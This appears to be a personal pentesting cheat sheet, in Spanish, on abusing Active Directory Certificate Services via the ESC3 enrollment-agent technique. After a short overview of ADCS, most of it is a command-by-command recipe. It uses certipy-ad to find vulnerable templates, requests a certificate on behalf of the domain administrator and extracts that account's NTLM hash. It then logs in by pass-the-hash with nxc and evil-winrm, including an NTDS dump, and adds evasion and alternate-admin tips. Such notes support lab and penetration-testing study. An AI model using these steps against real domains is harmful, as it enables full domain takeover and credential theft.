# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC3

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 3 - Issuance Policy / Application Policy

El atacante puede pedir un certificado en nombre de OTRO USUARIO. (Para utilizar o reemplazar a otra persona)

## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
```

```bash 
# Identificar la CA, servidores de inscripción y Web Enrollment
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' -M adcs 

	Found PKI Enrollment Server:
	Found CN:  
```

## ESC 3: Forma 1

```bash 
Paso 1:
# Solicitar un certificado para obtener un archivo llamado 'file.pfx'
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA_Name' -template 'Template_Name' -target IP_DC 

Paso 2:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA' -template 'User' -on-behalf-of 'domain.local\administrator' -pfx <file.pfx> -target IP_DC 

	# template = Se usa la plantilla 'User'
	# on-behalf-of = Mencionar que es en representación del usuario administrador

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 3:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 4:
# Conectarse al server como Administrator 
❯ nxc smb IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff --ntds 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff


NOTA:
	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
	- Puede que el usuario 'Administrator' no funcione, por lo que se debe de ver en Bloodhound que otros usuarios son admin y emitir el certificaado a su nombre. 
```